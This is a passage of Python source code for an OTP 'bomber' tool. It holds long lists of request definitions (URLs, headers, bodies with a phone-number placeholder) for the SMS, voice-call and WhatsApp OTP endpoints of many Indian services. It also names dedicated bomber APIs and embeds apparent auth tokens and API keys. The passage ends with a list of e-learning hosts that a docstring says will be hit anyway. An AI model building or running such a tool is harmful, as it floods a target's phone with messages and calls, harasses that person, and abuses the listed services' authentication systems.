        {"name":"Furlenco","url":"https://www.furlenco.com/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","term":"true"}},
        {"name":"CityFurnish","url":"https://www.cityfurnish.com/api/v1/auth/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Ixigo_Alt","url":"https://www.ixigo.com/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","countryCode":"+91"}},
        {"name":"EaseMyTrip","url":"https://www.easemytrip.com/api/otp/SendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"Mobileno":"{no}","Type":"M"}},
        {"name":"Goibibo","url":"https://www.goibibo.com/api/v2/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","countryCode":"+91"}},
        {"name":"RedBus_SMS","url":"https://www.redbus.in/api/getOtpV2","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneCode":"91","mobile":"{no}","whatsappOption":False,"reCaptchaResponse":"dummy"}},
        {"name":"Astroyogi_Comm_SMS","url":"https://comm.astroyogi.com/api/OtpComm/SendOtp","method":"POST","headers":{"Authorization":"Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJVc2VyVHlwZSI6IldlYlVzZXIiLCJFbnRpdHlJZCI6IjAiLCJTb3VyY2VVc2VyVHlwZSI6IiIsIlNvdXJjZUVudGl0eUlkIjoiIiwibmJmIjoxNzgwMTY4NDY1LCJleHAiOjE3ODc5NDQ0NjV9.","Accept-Language":"en-US","Accept":"application/json","Content-Type":"application/json"},"body":{"phoneCode":"91","countryCode":"IN","mobileNumber":"{no}","platform":"Web","IpAddress":"117.234.73.154","requestType":"sms","countryCodeByHeader":"IN"}},
        {"name":"AnytimeAstro","url":"https://www.anytimeastro.com/account/registermobile/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"},"body":{"ContactMobile":"{no}","MobCode":"%2B91","AcceptHuman":"true","CountryCode":"in","AcceptHumanenabled":"1","captchaenabled":"0"}},
        {"name":"Apollo247","url":"https://apigateway.apollo247.in/auth-service/generateOtp","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json;charset=utf-8","x-app-os":"web","x-app-device-id":"Desktop"},"body":{"loginType":"PATIENT","mobileNumber":"+{no}"}},
        {"name":"Jeevansathi","url":"https://www.jeevansathi.com/app-gateway/auth/v1/phone/otp","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/json","X-Requested-With":"XMLHttpRequest","JS-User-Agent":"JSMS"},"body":{"userId":"{no}","isd":"91","otpType":"LOGIN_PROFILE"}},
        {"name":"Yatra","url":"https://www.yatra.com/social/common/yatra/sendMobileOTP","method":"POST","headers":{"Accept":"application/json","Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"body":{"isdCode":"91","mobileNumber":"{no}"}},
        {"name":"Cleartrip","url":"https://www.cleartrip.com/accounts/external-api/otp","method":"POST","headers":{"channel":"PWA","x_ct_sourcetype":"MOBILE","Content-Type":"application/json","ab-otp":"b"},"body":{"value":"{no}","type":"MOBILE","action":"SIGNIN","countryCode":"+91"}},
        {"name":"Swiggy_SMS","url":"https://www.swiggy.com/mapi/auth/sms-otp","method":"POST","headers":{"Content-Type":"application/json","platform":"mweb"},"body":{"mobile":"{no}","_csrf":"3eux3tggHIFM-af_1Dssqu1f6xuveWY1yqrm0ggI"}},
        {"name":"Zepto","url":"https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","platform":"WEB","auth_revamp_flow":"v2","tenant":"ZEPTO","source":"DIRECT"},"body":{"mobileNumber":"{no}","countryCode":"+91"}},
        {"name":"SmartCoin","url":"https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request","method":"POST","headers":{"Content-Type":"application/json","user_platform":"WEBFLOW","platform_code":"olyv","origin":"https://app.olyv.co.in"},"body":{"phone_number":"{no}","app_version":"100101","channel":"IVR","request_type":"REGISTRATION","onboarding_consent":True}},
        {"name":"TataCapital_HL","url":"https://hlonline.tatacapital.com/APILayer/dlp/otp/services/generateOtp","method":"POST","headers":{"Content-Type":"application/json","origin":"https://www.tatacapital.com"},"body":{"mobileNumber":"{no}","isNew":1,"deviceOs":"web","webOsCapture":"Linux aarch64","deviceCapture":"Web-Android"}},
        {"name":"ShopClues","url":"https://www.shopclues.com/ajax/send_login_otp.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"},"body":"mobile={no}"},
        {"name":"IndiaLends","url":"https://indialends.com/pl/SP_MVResend","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","Referer":"https://indialends.com/personal-loan"},"body":"MobileNumber={no}&Mode=2"},
        {"name":"MagicPin_Call","url":"https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/","method":"POST","headers":{"Content-Type":"application/json","auth-secret-key":"kQLMCQBrfevxhzuPpFWT","origin":"https://magicpin.in"},"body":{"phoneNumber":"91{no}","authMethod":"call","token":"dummy_token"}},
        {"name":"Udaan_SMS","url":"https://auth.udaan.com/api/otp/send","method":"POST","params":{"client_id":"udaan-v2","whatsappConsent":"true"},"headers":{"x-app-id":"udaan-auth","content-type":"application/x-www-form-urlencoded;charset=UTF-8"},"body":"mobile={no}"},
        {"name":"Quikr","url":"https://www.quikr.com/core/register","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Myntra","url":"https://www.myntra.com/gateway/v1/auth/getotp","method":"POST","headers":{"Content-Type":"application/json","deviceId":"739ea08d-4757-4531-877d-f542e23870ed"},"body":{"phoneNumber":"{no}","signup":"ONECLICK"}},
        {"name":"MakeMyTrip_SMS","url":"https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP","method":"POST","params":{"region":"in","language":"eng","currency":"inr"},"headers":{"Content-Type":"application/json","vid":"d8a3a42f-1852-4ec7-aa6b-d715268e93b0","deviceid":"d8a3a42f-1852-4ec7-aa6b-d715268e93b0","Authorization":"h4nhc9jcgpAGIjp"},"body":{"loginId":"{no}","type":6,"isEncoded":False,"channel":["MOBILE"],"transactionId":False,"appHashKey":"@www.makemytrip.com #","countryCode":"91"}},
        {"name":"Jio","url":"https://www.jio.com/api/jio-login-service/login/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileNumber":"{no}","loginFlowType":"MOBILE","alternateNumber":""}},
        {"name":"Droom","url":"https://api.droom.in/v2/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"CarDekho","url":"https://api.cardekho.com/v1/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"OLX_SMS","url":"https://www.olx.in/api/auth/authenticate","method":"POST","params":{"lang":"en-IN"},"headers":{"Content-Type":"application/json","Accept":"*/*","User-Agent":"okhttp/3.9.1"},"body":{"method":"sms","phone":"{no}","language":"en-IN","grantType":"retry"}},
        {"name":"JioSaavn","url":"https://api1.jiosaavn.com/jio/sendOtp","method":"POST","params":{"__call":"jio/sendOtp","api_version":"4","_format":"json","_marker":"0","ctx":"wap6dot0"},"headers":{"Content-Type":"application/json","origin":"https://www.jiosaavn.com"},"body":{"phone_number":"+91{no}"}},
        {"name":"Sephora","url":"https://sephora.in/api/service/application/user/authentication/v1.0/login/otp","method":"POST","params":{"platform":"6523fa5f41f4eb4c10a1d869"},"headers":{"Content-Type":"application/json","authorization":"Bearer NjUyM2ZhNWY0MWY0ZWI0YzEwYTFkODY5Ong5Z0hpYWVpZA==","origin":"https://sephora.in"},"body":{"mobile":"{no}","country_code":"91"}},
        {"name":"Meesho","url":"https://api.meesho.com/v2/auth/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Croma","url":"https://api.croma.com/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"BigBasket","url":"https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile_number":"{no}"}},
        {"name":"Paytm","url":"https://accounts.paytm.com/signin/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","loginData":"LOGIN_USING_PHONE"}},
        {"name":"PhonePe","url":"https://www.phonepe.com/api/v2/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"OYO","url":"https://api.oyoroomscrm.com/api/v2/user/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Uber","url":"https://auth.uber.com/v2/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Flipkart_OTP","url":"https://www.flipkart.com/api/5/user/otp/generate","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","X-user-agent":"Mozilla/5.0 FKUA/website/41/website/Desktop"},"body":"loginId=+91{no}"},
        {"name":"Hotstar_OTP","url":"https://api.hotstar.com/um/v3/users/037a0fe368304ec798c3a1480936a112/register","method":"PUT","params":{"register-by":"phone_otp"},"headers":{"Content-Type":"application/json","x-country-code":"IN","X-HS-Platform":"mweb"},"body":{"phone_number":"{no}","country_prefix":"91"}},
        {"name":"Samsung_OTP","url":"https://www.samsung.com/in/api/v1/sso/otp/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"user_id":"{no}"}},
        {"name":"MuscleBlaze","url":"https://www.muscleblaze.com/veronica/user/validate/9/{no}/signup","method":"GET","params":{"plt":"2","st":"9"},"headers":{"origin":"https://www.muscleblaze.com","HKAUTH":"396144437|9l7fQT5m5HJtTrXqRZiWdQ==","pageuri":"/","st":"9","plt":"2"},"body":{}},
        {"name":"CreditSea","url":"https://backend.creditsea.com/api/v1/otp/generate-otp","method":"POST","headers":{"Content-Type":"application/json","platform":"CREDITSEA","origin":"https://www.creditsea.com"},"body":{"phoneNumber":"{no}","isWebUser":True}},
    ]
    apis.extend(sms)

    # ========== CALL APIs ==========
    call = [
        {"name":"1MG_Voice","url":"https://www.1mg.com/auth_api/v6/create_token","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/3.9.1"},"body":{"number":"{no}","otp_on_call":True}},
        {"name":"Swiggy_Call","url":"https://profile.swiggy.com/api/v3/app/request_call_verification","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"mobile":"{no}"}},
        {"name":"Myntra_Voice","url":"https://www.myntra.com/gw/mobile-auth/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Flipkart_Voice","url":"https://www.flipkart.com/api/6/user/voice-otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Paytm_Voice","url":"https://accounts.paytm.com/signin/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Ola_Voice","url":"https://api.olacabs.com/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Uber_Voice","url":"https://auth.uber.com/v2/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"+91{no}"}},
        {"name":"Kotak_Voice","url":"https://www.kotak.com/api/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Amazon_Voice","url":"https://www.amazon.in/ap/signin","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"phone={no}&action=voice_otp"},
        {"name":"MakeMyTrip_Voice","url":"https://www.makemytrip.com/api/4/voice-otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"PhonePe_Voice","url":"https://www.phonepe.com/api/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"BigBasket_Voice","url":"https://www.bigbasket.com/api/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"BookMyShow_Voice","url":"https://in.bookmyshow.com/api/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"RedBus_Voice","url":"https://www.redbus.in/api/v1/voice-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Proptiger_Call","url":"https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call","method":"POST","headers":{"Content-Type":"application/json"},"body":{"contactNumber":"{no}","domainId":"2"}},
        {"name":"Snitch_Voice","url":"https://www.snitch.com/api/auth/resend-otp","method":"POST","params":{"mode":"voice"},"headers":{"Content-Type":"application/json","X-CAP-Token":"1d059f0c33c4d34b:868c9d763b60c83616551acdd002e6"},"body":{"mobile_number":"+{no}"}},
        {"name":"RummyCircle_Voice","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isPlaycircle":False,"otpOnCall":True}},
        {"name":"Ixigo_Call","url":"https://www.ixigo.com/api/v4/oauth/dual/mobile/send-otp","method":"POST","headers":{"Content-type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","apiKey":"iximweb!2$","ixiSrc":"iximweb","clientId":"iximweb","deviceId":"5416efcf017344f9ba6a","uuid":"5416efcf017344f9ba6a"},"body":"token=18506fc6b7db226aeae68f1e32a8f8a3ad8ab4e798180fe0c0735955fe5a15c6f981eb24306db4a1fb5e627df48a298cacd93de8ad0545ab93af16ed5386cc7d&sixDigitOTP=true&prefix=%2B91&phone={no}&resendOnCall=true"},
        {"name":"Doubtnut_Call","url":"https://micro.doubtnut.com/otp/send-call","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/5.0.0-alpha.2"},"body":{"phone":"{no}","locale":"en"}},
        {"name":"Bomberr_Call","url":"https://bomberr.onrender.com/num={no}","method":"GET","headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"Niloy_Call_API","url":"https://rk-niloy-call-api.vercel.app/api","method":"GET","params":{"phone":"{no}"},"headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"Call_API_Sable","url":"https://call-api-sable.vercel.app/bomb/{no}","method":"GET","headers":{"User-Agent":"Mozilla/5.0"},"body":{}},
        {"name":"RK_Niloy_Call","url":"https://rk-niloy-call-api-sigma.vercel.app/api","method":"GET","params":{"phone":"{no}"},"headers":{"User-Agent":"Mozilla/5.0","Accept":"application/json"},"body":{}},
        {"name":"OTP_Bomber_API","url":"https://otp-bomber-api.vercel.app/api","method":"GET","params":{"phone":"{no}"},"headers":{"User-Agent":"Mozilla/5.0","Accept":"application/json"},"body":{}},
        {"name":"BomberQ_API","url":"https://bomberqapis.vercel.app/bomb","method":"GET","params":{"number":"{no}"},"headers":{"User-Agent":"Mozilla/5.0","Accept":"application/json"},"body":{}},
        {"name":"MyAstro","url":"https://myastro.org.in/sendOtpPinnacle","method":"GET","params":{"phone":"{no}"},"headers":{"X-Requested-With":"XMLHttpRequest"},"body":{}},
        {"name":"Milkbasket_Voice","url":"https://consumerbff.milkbasket.com/graphql","method":"POST","headers":{"Content-Type":"application/json","appplatform":"web","appversion":"8.0.9.0"},"body":{"operationName":"registerNumber","variables":{"phone":"{no}","retry":True,"retryType":"voice","appHash":"","udid":"QZg2sH1J6vHLMwDK"},"query":"mutation registerNumber($phone: String!, $retry: Boolean!, $retryType: String!, $appHash: String!, $udid: String!) { registerPhoneNumber(phone: $phone retry: $retry retryType: $retryType appHash: $appHash udid: $udid) { status error errorMsg otpBlockTime __typename } }"}}
    ]
    apis.extend(call)

    # ========== WHATSAPP APIs ==========
    wa = [
        {"name":"KPN_WhatsApp","url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate","method":"POST","params":{"channel":"AND","version":"3.2.6"},"headers":{"x-app-id":"66ef3594-1e51-4e15-87c5-05fc8208a20f","content-type":"application/json; charset=UTF-8"},"body":{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{no}"}}},
        {"name":"Foxy_WhatsApp","url":"https://www.foxy.in/api/v2/users/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"user":{"phone_number":"+91{no}"},"via":"whatsapp"}},
        {"name":"Stratzy_WhatsApp","url":"https://stratzy.in/api/web/whatsapp/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNo":"{no}"}},
        {"name":"Rappi_WhatsApp","url":"https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8","User-Agent":"okhttp/3.9.1"},"body":{"country_code":"+91","phone":"{no}"}},
        {"name":"Meesho_WhatsApp","url":"https://meesho.com/gw/login-register/v1/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"number":"{no}","otpOnCall":True}},
        {"name":"Refyne_WhatsApp","url":"https://prod-api.refyne.co.in/auth/v3/send-otp","method":"POST","headers":{"Content-Type":"application/json","Authorization":"Bearer"},"body":{"channel":"WHATSAPP","recipient":"{no}"}},
        {"name":"Zomato_WhatsApp","url":"https://accounts.zomato.com/login/phone","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","x-zomato-api-key":"7749b19667964b87a3efc739e254ada2"},"body":{"number":"{no}","country_id":"1","lc":"af07c17656e641efbfcc489f51aea946","type":"initiate","verification_type":"whatsapp","package_name":""}},
        {"name":"Agoda_WhatsApp","url":"https://www.agoda.com/ul/api/v1/auth","method":"POST","headers":{"ul-fallback-origin":"https://www.agoda.com","ul-app-id":"mspa","Content-Type":"application/json; charset=utf-8"},"body":{"email":"","keepMeSignedIn":False,"whatsapp":"+{no}"}},
    ]
    apis.extend(wa)

    # ========== REMOVE DUPLICATES ==========
    seen = set()
    unique = []
    for api in apis:
        key = f"{api.get('url','')}_{api.get('method','')}"
        if key not in seen:
            seen.add(key)
            unique.append(api)

    return unique


# ============================================================
# CLASSX/TEACHX APIS - the new big list
# FIX: These are different - they need to be converted properly
# ============================================================
CLASSX_API_RAW = [
    {"name": "A4Agricos", "api": "https://a4agricosapi.classx.co.in"},
    {"name": "A4Shub", "api": "https://a4shubapi.classx.co.in"},
    # ... (the full list is huge, we'll generate entries programmatically)
]


def build_classx_api_list():
    """
    Build a list of API entries from classx.co.in URLs.
    These are e-learning APIs. The common pattern is:
      POST {api_url}/api/v2/get-all-course
      POST {api_url}/api/v2/get-course-details
      POST {api_url}/api/v2/send-otp
    
    We'll use a generic OTP endpoint pattern. Many of these are actually
    not OTP senders - they're course APIs. But if the user wants them included,
    we'll send a POST to common auth endpoints.
    """
    # This is the full list from the user
    raw_list = [
        {"name": "A4Agricos", "api": "https://a4agricosapi.classx.co.in"},
        {"name": "A4Shub", "api": "https://a4shubapi.classx.co.in"},
        {"name": "Aacharyaayurveda", "api": "https://aacharyaayurvedaapi.classx.co.in"},
        {"name": "Aadarshonlineeducation", "api": "https://aadarshonlineeducationapi.classx.co.in"},
        {"name": "Aadharclasses", "api": "https://aadharclassesjhunjhunuapi.classx.co.in"},
        {"name": "Aadiwasikritisamiti", "api": "https://aadiwasikritisamitiapi.classx.co.in"},
        {"name": "Aagaazinstitution", "api": "https://aagaazinstitutionapi.classx.co.in"},
        {"name": "Aagamclasses", "api": "https://aagamclassesapi.classx.co.in"},
        {"name": "Aakarlearningapp", "api": "https://aakarlearningapi.classx.co.in"},
        {"name": "Aakartutorials", "api": "https://aakartutorialsapi.classx.co.in"},
        {"name": "Aakashkrishnaacademy", "api": "https://aakashkrishnaacademyapi.classx.co.in"},
        {"name": "Aalphaglobalinstitute", "api": "https://aalphaglobalinstituteapi.classx.co.in"},
        {"name": "Aaonlinesolution", "api": "https://aaonlinesolutionapi.classx.co.in"},
        {"name": "Aapkipathshala", "api": "https://aapkipathshalaapi.classx.co.in"},
        {"name": "Aapnipadhai", "api": "https://aapnipadhaiapi.classx.co.in"},
        {"name": "Aarambhacademy", "api": "https://aarambhacademyapi.classx.co.in"},
        {"name": "Aarambhvidyapith", "api": "https://aarambhvidyapithapi.classx.co.in"},
        {"name": "Aarohacademy", "api": "https://aarohacademyapi.classx.co.in"},
        {"name": "Aash", "api": "https://aashapi.appx.co.in"},
        {"name": "Aasthabhavthramayan", "api": "https://aasthabhavathramayanapi.classx.co.in"},
        {"name": "Aatmnirmanacademy", "api": "https://aatmnirmanacademyapi.classx.co.in"},
        {"name": "Abhigyaias", "api": "https://abhigyaiasapi.classx.co.in"},
        {"name": "Abhimanyuacademyindore", "api": "https://abhimanyuacademyindoreapi.classx.co.in"},
        {"name": "Abhinanadanclasseskotputali", "api": "https://abhinanadanclasseskotputaliapi.classx.co.in"},
        {"name": "Abhinavmotordrivingschoolapp", "api": "https://abhinavmotordrivingschoolapi.classx.co.in"},
        {"name": "Abhishektehanguriyaclasses", "api": "https://abhishektehanguriyaclassesapi.classx.co.in"},
        {"name": "Abhiyaanacademyforiasips", "api": "https://abhiyaanacademyiasipsapi.classx.co.in"},
        {"name": "Abhyaasagriacademy", "api": "https://abhyaasagriacademyapi.classx.co.in"},
        {"name": "Abhyaasagriacademy20", "api": "https://abhyaasagriacademy20api.classx.co.in"},
        {"name": "Abhyasa", "api": "https://abhyasaapi.classx.co.in"},
        {"name": "Abhyasmitra", "api": "https://abhyasmitraapi.classx.co.in"},
        {"name": "Abjeetenge", "api": "https://abjeetengeapi.classx.co.in"},
        {"name": "Ablazeacademy", "api": "https://ablazeacademyapi.classx.co.in"},
        {"name": "Abplearning", "api": "https://abplearningapi.classx.co.in"},
        {"name": "Academiczoneclassbuddy", "api": "https://academiczoneapi.classx.co.in"},
        {"name": "Academiyaofficialliveclassesquizpdf", "api": "https://academiyaofficialapi.classx.co.in"},
        {"name": "Academy99Byanoopjain", "api": "https://academyanoopjainapi.classx.co.in"},
        {"name": "Academycommerce", "api": "https://academycommerceapi.classx.co.in"},
        {"name": "Academyofclinicalresearch", "api": "https://academyclinicalresearchapi.classx.co.in"},
        {"name": "Acewithease", "api": "https://acewitheaseapi.classx.co.in"},
        {"name": "Acfofficial", "api": "https://acfofficialapi.classx.co.in"},
        {"name": "Acharyakulambiharnaveensir", "api": "https://acharyakulambiharnaveenapi.classx.co.in"},
        {"name": "Achievecapf", "api": "https://achievecapfapi.classx.co.in"},
        {"name": "Achiever", "api": "https://achieversacademyapi.appx.co.in"},
        {"name": "Achieverpoint", "api": "https://achieverpointapi.classx.co.in"},
        {"name": "Achieversacademy", "api": "https://achieversacademyapi.classx.co.in"},
        {"name": "Achieversadda247", "api": "https://achieversadda247api.classx.co.in"},
        {"name": "Achiverseducation", "api": "https://achiverseducationapi.classx.co.in"},
        {"name": "Aclasseducation", "api": "https://aclasseducationapi.classx.co.in"},
        {"name": "Acmecommerceclasses", "api": "https://acmecommerceclassesapi.classx.co.in"},
        {"name": "Acracademy", "api": "https://acracademyapi.classx.co.in"},
        {"name": "Adarmypoint", "api": "https://adarmypointapi.classx.co.in"},
        {"name": "Adarshacademys20", "api": "https://adarshacademyapi.classx.co.in"},
        {"name": "Adarshiasacademy", "api": "https://adarshiasacademyapi.classx.co.in"},
        {"name": "Adconcept", "api": "https://adconceptapi.classx.co.in"},
        {"name": "Adhigamclassesjaipur", "api": "https://adhigamclassesjaipurapi.classx.co.in"},
        {"name": "Adhijayclasses", "api": "https://adhijayclassesapi.classx.co.in"},
        {"name": "Adhyayan", "api": "https://adhyayanmantraapi.appx.co.in"},
        {"name": "Adhyayankendra", "api": "https://adhyayankendraapi.classx.co.in"},
        {"name": "Adinarayanaacademy2", "api": "https://adinarayanaacademytwoapi.classx.co.in"},
        {"name": "Adityanareshmathsclasses", "api": "https://adityanareshmathsclassesapi.classx.co.in"},
        {"name": "Adityaschoolofbanking", "api": "https://adityaschoolbankingapi.classx.co.in"},
        {"name": "Adlive", "api": "https://adliveapi.classx.co.in"},
        {"name": "Advancempsc", "api": "https://advancempscapi.classx.co.in"},
        {"name": "Agastyasacademy", "api": "https://agastyasacademyapi.classx.co.in"},
        {"name": "Agentsuvidha", "api": "https://agentsuvidhaapi.classx.co.in"},
        {"name": "Agkrishnaspokenhindi", "api": "https://agkrishnaspokenhindiapi.classx.co.in"},
        {"name": "Agnihotriclasses", "api": "https://agnihotriclassesapi.classx.co.in"},
        {"name": "Agnitutor", "api": "https://agnitutorapi.classx.co.in"},
        {"name": "Agniveerguruji", "api": "https://agniveergurujiapi.classx.co.in"},
        {"name": "Agniveerstudyarmynavyairforce", "api": "https://agniveerstudyarmynavyairforceapi.classx.co.in"},
        {"name": "Agogeclassesacharyagram", "api": "https://agogeclassesapi.classx.co.in"},
        {"name": "Agradeclasses", "api": "https://agradeclassesapi.classx.co.in"},
        {"name": "Agriacademyhisar", "api": "https://agriacademyhisarapi.classx.co.in"},
        {"name": "Agriaware", "api": "https://agriawareapi.classx.co.in"},
        {"name": "Agricoaching", "api": "https://agricoachingapi.appx.co.in"},
        {"name": "Agricoaching", "api": "https://agricoachingapi.classx.co.in"},
        {"name": "Agricultureacademyjaipur", "api": "https://agricultureacademyjaipurapi.classx.co.in"},
        {"name": "Agricultureadda", "api": "https://agricultureaddaapi.classx.co.in"},
        {"name": "Agricultureexpert", "api": "https://agricultureexpertapi.classx.co.in"},
        {"name": "Agriculturegk", "api": "https://agriculturegkapi.classx.co.in"},
        {"name": "Agriculturepadhaiexamprep", "api": "https://agriculturepadhaiexamprepapi.classx.co.in"},
        {"name": "Agrieducators", "api": "https://agrieducatorsapi.classx.co.in"},
        {"name": "Agriexamlibrary", "api": "https://agriexamlibraryapi.classx.co.in"},
        {"name": "Agrimentors", "api": "https://agrimentorsapi.classx.co.in"},
        {"name": "Agrimshiksha", "api": "https://agrimshikshaapi.classx.co.in"},
        {"name": "Agripathclassesudaipur", "api": "https://agripathclassesudaipurapi.classx.co.in"},
        {"name": "Agripmfqualityagriculture", "api": "https://agripmfqualityagricultureapi.classx.co.in"},
        {"name": "Agripowerjaipurcoaching", "api": "https://agripowerjaipurcoachingapi.classx.co.in"},
        {"name": "Agrirevolution", "api": "https://agrirevolutionapi.classx.co.in"},
        {"name": "Agriselectionpoint", "api": "https://agriselectionpointapi.classx.co.in"},
        {"name": "Agritubeplus", "api": "https://agritubeplusapi.classx.co.in"},
        {"name": "Agriyug", "api": "https://agriyugapi.classx.co.in"},
        {"name": "Agrizoneclasses", "api": "https://agrizoneclassesapi.classx.co.in"},
        {"name": "Aiapgetpocketapp", "api": "https://aiapgetpocketappapi.classx.co.in"},
        {"name": "Aifmeducation", "api": "https://aifmeducationapi.classx.co.in"},
        {"name": "Aimers", "api": "https://aimersapi.classx.co.in"},
        {"name": "Aimersacademy", "api": "https://aimersacademyapi.classx.co.in"},
        {"name": "Aiminghigh", "api": "https://aiminghighapi.classx.co.in"},
        {"name": "Ajaybeniwalmaths", "api": "https://ajaybeniwalmathsapi.classx.co.in"},
        {"name": "Ajaygurukul", "api": "https://ajaygurukulapi.classx.co.in"},
        {"name": "Ajaynyolmathematics", "api": "https://ajaynyolmathematicsapi.classx.co.in"},
        {"name": "Ajitchahalschallengersacademy", "api": "https://ajitchahalchallengersacademyapi.classx.co.in"},
        {"name": "Akashlectureonline", "api": "https://akashlectureonlineapi.classx.co.in"},
        {"name": "Akashtalks", "api": "https://akashtalksapi.classx.co.in"},
        {"name": "Akb", "api": "https://akbpublicationeducationapi.classx.co.in"},
        {"name": "Akdubeytutorials", "api": "https://akdubeytutorialsapi.classx.co.in"},
        {"name": "Akeduspot", "api": "https://akeduspotapi.classx.co.in"},
        {"name": "Akengineeringacademy", "api": "https://akengineeringacademyapi.classx.co.in"},
        {"name": "Akfoundation", "api": "https://akfoundationapi.classx.co.in"},
        {"name": "Akihimselfschoolofmusic", "api": "https://akihimselfschoolmusicapi.classx.co.in"},
        {"name": "Aksgroup", "api": "https://aksgroupapi.classx.co.in"},
        {"name": "Akshaybhise", "api": "https://akshaybhiseapi.classx.co.in"},
        {"name": "Akstechnicalclasses", "api": "https://akstechnicalclassesapi.classx.co.in"},
        {"name": "Akstudy", "api": "https://akstudyapi.classx.co.in"},
        {"name": "Alakclasses", "api": "https://alakclassesapi.classx.co.in"},
        {"name": "Alkamedicalclasses", "api": "https://alkamedicalclassesapi.classx.co.in"},
        {"name": "Allexamadda", "api": "https://allexamaddaapi.classx.co.in"},
        {"name": "Allexamguru", "api": "https://allexamguruapi.classx.co.in"},
        {"name": "Allexamlive", "api": "https://allexamapi.classx.co.in"},
        {"name": "Allexamplace", "api": "https://allexamplaceapi.classx.co.in"},
        {"name": "Allfintalk", "api": "https://allfintalkapi.classx.co.in"},
        {"name": "Alliedias", "api": "https://alliediasapi.classx.co.in"},
        {"name": "Allindiafoundation", "api": "https://allindiafoundationapi.classx.co.in"},
        {"name": "Alltimetoppers", "api": "https://alltimetoppersapi.classx.co.in"},
        {"name": "Aloft", "api": "https://aloftpreparationapi.classx.co.in"},
        {"name": "Alphainstitutepro", "api": "https://alphainstituteproapi.classx.co.in"},
        {"name": "Alphaplus", "api": "https://alphaplusapi.classx.co.in"},
        {"name": "Alphaspokenenglish", "api": "https://alphaspokenenglishapi.classx.co.in"},
        {"name": "Amajawan", "api": "https://amajawanapi.classx.co.in"},
        {"name": "Amanpathshala", "api": "https://amanpathshalaapi.classx.co.in"},
        {"name": "Amansir", "api": "https://amansirenglishapi.classx.co.in"},
        {"name": "Amarnadhsirclasses", "api": "https://amarnadhsirclassesapi.classx.co.in"},
